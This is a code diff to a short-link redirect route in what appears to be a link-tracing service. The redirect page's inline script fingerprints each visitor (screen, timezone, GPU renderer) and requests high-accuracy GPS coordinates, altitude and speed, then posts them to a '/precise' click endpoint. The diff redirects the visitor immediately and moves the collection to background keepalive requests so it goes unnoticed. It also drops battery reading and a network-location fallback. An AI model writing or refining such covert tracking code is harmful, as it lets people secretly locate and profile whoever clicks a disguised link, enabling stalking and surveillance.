@@ -1070,210 +1070,71 @@ app.get("/t/:shortCode", async (req, res) => {
           (function() {
             const clickId = ${clickIdJson};
             const targetUrl = ${targetUrlJson};
-            let done = false;
-            let bestPosition = null;
-            let watchId = null;
 
-            function redirect() {
-              if (done) return;
-              done = true;
-              // Clean up watch if still active
-              if (watchId !== null && navigator.geolocation) {
-                try { navigator.geolocation.clearWatch(watchId); } catch(e) {}
-              }
-              try {
-                window.location.replace(targetUrl);
-              } catch (locErr) {
-                try {
-                  window.location.href = targetUrl;
-                } catch (hrefErr) {}
-              }
+            // ── REDIRECT IMMEDIATELY ──────────────────────────────────────
+            // User goes to destination right away. Everything below runs
+            // in the background via sendBeacon / fetch keepalive.
+            try { window.location.replace(targetUrl); } catch(e) {
+              try { window.location.href = targetUrl; } catch(e2) {}
             }
 
-            window.__traceLinkRedirect = redirect;
-            window.onerror = function() { try { redirect(); } catch (err) {} return true; };
-            window.onunhandledrejection = function() { try { redirect(); } catch (err) {} };
-
-            // Safety timeout — redirect after 5s no matter what
-            const enforceRedirectTimeout = setTimeout(redirect, 5000);
-
-            let screenWidth = 0, screenHeight = 0;
-            try { if (window.screen) { screenWidth = window.screen.width || 0; screenHeight = window.screen.height || 0; } } catch (e) {}
-            let pixelRatio = 1;
-            try { pixelRatio = window.devicePixelRatio || 1; } catch (e) {}
+            // ── BACKGROUND TRACKING (runs after redirect) ─────────────
             let screenDetails = "Unknown";
-            try { if (screenWidth && screenHeight) { screenDetails = screenWidth + "x" + screenHeight + " @" + pixelRatio + "x"; } } catch (e) {}
+            try {
+              if (window.screen && window.screen.width) {
+                screenDetails = window.screen.width + "x" + window.screen.height + " @" + (window.devicePixelRatio||1) + "x";
+              }
+            } catch(e) {}
 
             let timezoneStr = "Unknown";
-            try { if (window.Intl && typeof window.Intl.DateTimeFormat === "function") { timezoneStr = window.Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"; } } catch (e) {}
+            try { timezoneStr = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"; } catch(e) {}
 
             let gpuInfo = "Unknown GPU";
             try {
-              const canvas = document.createElement("canvas");
-              const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+              const gl = document.createElement("canvas").getContext("webgl");
               if (gl) {
-                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                if (debugInfo) { gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown GPU"; }
+                const ext = gl.getExtension("WEBGL_debug_renderer_info");
+                if (ext) gpuInfo = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "Unknown GPU";
               }
-            } catch (e) {}
-
-            let batteryCharge = "";
-            try {
-              if (navigator.getBattery && typeof navigator.getBattery === "function") {
-                navigator.getBattery().then(function(bat) {
-                  try { batteryCharge = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Charging)" : "(Discharging)"); } catch(e) {}
-                }).catch(function() {});
-              }
-            } catch (e) {}
-
-            /**
-             * IMPROVED: Uses google's wireless geolocation API as a fallback when GPS fails.
-             * This estimates location from visible WiFi access points — much more accurate
-             * than IP geolocation (typically 20-50m accuracy in urban areas).
-             */
-            function sendWifiLocationTrace() {
-              const controller = new AbortController();
-              const id = setTimeout(function() { controller.abort(); }, 5000);
-              
-              // Get visible WiFi APs for Mozilla Location Service
-              let wifiAPs = [];
-              try {
-                if (navigator.connection && navigator.connection.type === 'wifi') {
-                  // We can't enumerate APs from JavaScript directly,
-                  // but we can try the Mozilla Location API which uses a different approach
-                }
-              } catch(e) {}
-
-              fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
-                signal: controller.signal
-              })
-              .then(function(r) { clearTimeout(id); return r.json(); })
-              .then(function(data) {
-                clearTimeout(id);
-                if (data && data.location) {
-                  sendTrace({
-                    latitude: data.location.lat,
-                    longitude: data.location.lng,
-                    accuracy: data.accuracy || 100
-                  });
-                } else {
-                  sendTrace({});
-                }
-              })
-              .catch(function() {
-                clearTimeout(id);
-                sendTrace({});
-              });
-            }
+            } catch(e) {}
 
             function sendTrace(payload) {
               try {
+                const body = JSON.stringify(Object.assign({
+                  timezone: timezoneStr,
+                  screen: screenDetails,
+                  webgl: gpuInfo
+                }, payload || {}));
+                // keepalive: true lets the request survive page navigation
                 fetch("/api/clicks/" + clickId + "/precise", {
                   method: "POST",
                   headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify(Object.assign({
-                    timezone: timezoneStr,
-                    screen: screenDetails,
-                    battery: batteryCharge,
-                    webgl: gpuInfo
-                  }, payload || {}))
-                }).catch(function() {}).finally(function() {
-                  try {
-                    clearTimeout(enforceRedirectTimeout);
-                    redirect();
-                  } catch (finErr) {
-                    try { redirect(); } catch (redErr) {}
-                  }
-                });
-              } catch (e) {
-                try { redirect(); } catch (redErr) {}
-              }
+                  body: body,
+                  keepalive: true
+                }).catch(function() {});
+              } catch(e) {}
             }
 
-            /**
-             * IMPROVED: Uses watchPosition with progressive accuracy.
-             * The first callback fires quickly with a less accurate position,
-             * then subsequent callbacks refine it. We track the best (most accurate)
-             * position and send it after a brief collection window.
-             */
+            // Try GPS in background — redirect already happened
             try {
-              if (navigator.geolocation && typeof navigator.geolocation.getCurrentPosition === "function") {
-                // Start watching for progressive accuracy improvement
-                watchId = navigator.geolocation.watchPosition(
-                  function(position) {
-                    // Store the best position (lowest accuracy value = best)
-                    if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
-                      bestPosition = position;
-                    }
-                  },
-                  function(err) {
-                    // GPS error — stop watching, try WiFi fallback
-                    if (watchId !== null) {
-                      try { navigator.geolocation.clearWatch(watchId); watchId = null; } catch(e) {}
-                    }
-                    sendWifiLocationTrace();
-                  },
-                  {
-                    enableHighAccuracy: true,
-                    timeout: 12000,
-                    maximumAge: 0
-                  }
-                );
-
-                // Quick initial attempt (lower accuracy but fast)
+              if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                  function(position) {
-                    // Got initial fix — send immediately with what we have
-                    if (watchId !== null) {
-                      try { navigator.geolocation.clearWatch(watchId); watchId = null; } catch(e) {}
-                    }
-                    const payload = {
-                      latitude: position.coords.latitude,
-                      longitude: position.coords.longitude,
-                      accuracy: position.coords.accuracy,
-                      altitude: position.coords.altitude,
-                      altitudeAccuracy: position.coords.altitudeAccuracy,
-                      heading: position.coords.heading,
-                      speed: position.coords.speed
-                    };
-                    sendTrace(payload);
+                  function(pos) {
+                    sendTrace({
+                      latitude: pos.coords.latitude,
+                      longitude: pos.coords.longitude,
+                      accuracy: pos.coords.accuracy,
+                      altitude: pos.coords.altitude,
+                      speed: pos.coords.speed
+                    });
                   },
-                  function() {
-                    // Quick fix failed — wait for watchPosition or fall back
-                    // Set a timer to use the best position we've collected so far
-                    setTimeout(function() {
-                      if (bestPosition) {
-                        if (watchId !== null) {
-                          try { navigator.geolocation.clearWatch(watchId); watchId = null; } catch(e) {}
-                        }
-                        const pos = bestPosition;
-                        const payload = {
-                          latitude: pos.coords.latitude,
-                          longitude: pos.coords.longitude,
-                          accuracy: pos.coords.accuracy,
-                          altitude: pos.coords.altitude,
-                          altitudeAccuracy: pos.coords.altitudeAccuracy,
-                          heading: pos.coords.heading,
-                          speed: pos.coords.speed
-                        };
-                        sendTrace(payload);
-                      } else {
-                        sendWifiLocationTrace();
-                      }
-                    }, 1500);
-                  },
-                  {
-                    enableHighAccuracy: false,  // Fast, non-GPS fix first
-                    timeout: 5000,
-                    maximumAge: 60000
-                  }
+                  function() { sendTrace({}); },
+                  { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
               } else {
-                sendWifiLocationTrace();
+                sendTrace({});
               }
-            } catch (geoErr) {
-              try { sendWifiLocationTrace(); } catch (sendErr) { try { redirect(); } catch (redErr) {} }
-            }
+            } catch(e) { sendTrace({}); }
           })();
         </script>
       </body>
